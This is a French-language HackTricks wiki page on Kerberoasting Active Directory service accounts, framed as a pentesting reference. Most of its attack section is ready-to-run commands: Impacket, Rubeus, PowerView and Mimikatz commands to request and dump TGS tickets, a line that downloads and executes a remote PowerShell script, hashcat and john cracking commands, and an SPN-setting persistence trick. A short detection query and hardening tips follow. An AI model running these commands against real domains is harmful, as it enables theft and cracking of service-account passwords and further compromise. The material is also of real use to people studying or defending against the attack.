# Kerberoast

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) pour construire facilement et **automatiser des workflows** alimentés par les outils communautaires les plus avancés au monde.\
Accédez dès aujourd'hui :

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.

</details>

## Kerberoast

Le Kerberoasting se concentre sur l'acquisition de **tickets TGS**, en particulier ceux liés aux services fonctionnant sous des **comptes utilisateur** dans **Active Directory (AD)**, à l'exclusion des **comptes d'ordinateur**. Le chiffrement de ces tickets utilise des clés provenant des **mots de passe des utilisateurs**, permettant la possibilité de **cassage de crédentials hors ligne**. L'utilisation d'un compte utilisateur en tant que service est indiquée par une propriété **"ServicePrincipalName"** non vide.

Pour exécuter le **Kerberoasting**, un compte de domaine capable de demander des **tickets TGS** est essentiel ; cependant, ce processus ne nécessite pas de **privilèges spéciaux**, le rendant accessible à toute personne disposant de **justes identifiants de domaine**.

### Points clés :

* Le **Kerberoasting** cible les **tickets TGS** des **services de compte utilisateur** dans **AD**.
* Les tickets chiffrés avec des clés provenant des **mots de passe des utilisateurs** peuvent être **cassés hors ligne**.
* Un service est identifié par un **ServicePrincipalName** qui n'est pas nul.
* Aucun **privilège spécial** n'est nécessaire, juste des **identifiants de domaine valides**.

### **Attaque**

{% hint style="warning" %}
Les **outils de Kerberoasting** demandent généralement le **chiffrement RC4** lors de l'attaque et de l'initiation des demandes TGS-REQ. Cela est dû au fait que **RC4 est** [**plus faible**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) et plus facile à casser hors ligne à l'aide d'outils tels que Hashcat que d'autres algorithmes de chiffrement tels que AES-128 et AES-256.\
Les hachages RC4 (type 23) commencent par **`$krb5tgs$23$*`** tandis que ceux de AES-256 (type 18) commencent par **`$krb5tgs$18$*`**.
{% endhint %}

#### **Linux**
```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```
Outils multi-fonctionnalités incluant un dump des utilisateurs pouvant être kerberoastés :
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```
#### Windows

* **Énumérer les utilisateurs pouvant être ciblés par une attaque Kerberoast**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
* **Technique 1: Demander le TGS et le vider de la mémoire**
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
* **Technique 2: Outils automatiques**
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
{% hint style="warning" %}
Lorsqu'un TGS est demandé, l'événement Windows `4769 - Un ticket de service Kerberos a été demandé` est généré.
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) pour construire et **automatiser facilement** des flux de travail alimentés par les outils communautaires les plus avancés au monde.\
Accédez dès aujourd'hui :

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}

### Cracking
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Persistance

Si vous avez **suffisamment de permissions** sur un utilisateur, vous pouvez le rendre **kerberoastable** :
```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
Vous pouvez trouver des **outils** utiles pour les attaques **kerberoast** ici : [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

Si vous rencontrez cette **erreur** depuis Linux : **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`**, c'est à cause de l'heure locale, vous devez synchroniser l'hôte avec le contrôleur de domaine. Voici quelques options :

* `ntpdate <IP du DC>` - Obsolète à partir d'Ubuntu 16.04
* `rdate -n <IP du DC>`

### Atténuation

Le Kerberoasting peut être effectué avec un haut degré de discrétion s'il est exploitable. Afin de détecter cette activité, il convient de prêter attention à l'**ID d'événement de sécurité 4769**, qui indique qu'un ticket Kerberos a été demandé. Cependant, en raison de la fréquence élevée de cet événement, des filtres spécifiques doivent être appliqués pour isoler les activités suspectes :

* Le nom du service ne doit pas être **krbtgt**, car il s'agit d'une demande normale.
* Les noms de service se terminant par **$** doivent être exclus pour éviter d'inclure les comptes machine utilisés pour les services.
* Les demandes provenant des machines doivent être filtrées en excluant les noms de compte formatés comme **machine@domain**.
* Seules les demandes de ticket réussies doivent être prises en compte, identifiées par un code d'erreur de **'0x0'**.
* **Surtout**, le type de chiffrement du ticket doit être **0x17**, ce qui est souvent utilisé dans les attaques de Kerberoasting.
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
Pour atténuer le risque de Kerberoasting :

* Assurez-vous que **les mots de passe des comptes de service sont difficiles à deviner**, en recommandant une longueur de plus de **25 caractères**.
* Utilisez des **Comptes de Service Gérés**, qui offrent des avantages tels que **des changements de mot de passe automatiques** et **une gestion déléguée du Service Principal Name (SPN)**, renforçant la sécurité contre de telles attaques.

En mettant en œuvre ces mesures, les organisations peuvent réduire significativement le risque associé au Kerberoasting.

## Kerberoast sans compte de domaine

En **septembre 2022**, une nouvelle méthode pour exploiter un système a été révélée par un chercheur nommé Charlie Clark, partagée sur sa plateforme [exploit.ph](https://exploit.ph/). Cette méthode permet l'acquisition de **Tickets de Service (ST)** via une requête **KRB\_AS\_REQ**, qui ne nécessite pas le contrôle d'un compte Active Directory. Essentiellement, si un principal est configuré de manière à ne pas nécessiter de pré-authentification - un scénario similaire à ce qui est connu dans le domaine de la cybersécurité comme une attaque **AS-REP Roasting** - cette caractéristique peut être exploitée pour manipuler le processus de requête. Plus précisément, en modifiant l'attribut **sname** dans le corps de la requête, le système est trompé pour émettre un **ST** au lieu du Ticket Granting Ticket (TGT) chiffré standard.

La technique est entièrement expliquée dans cet article : [article de blog Semperis](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

{% hint style="warning" %}
Vous devez fournir une liste d'utilisateurs car nous n'avons pas de compte valide pour interroger le LDAP en utilisant cette technique.
{% endhint %}

#### Linux

* [impacket/GetUserSPNs.py de la PR #1413](https://github.com/fortra/impacket/pull/1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```
#### Windows

* [GhostPack/Rubeus de PR #139](https://github.com/GhostPack/Rubeus/pull/139):
```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```
## Références

* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) pour construire et **automatiser facilement des workflows** alimentés par les outils communautaires les plus avancés au monde.\
Accédez dès aujourd'hui :

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}
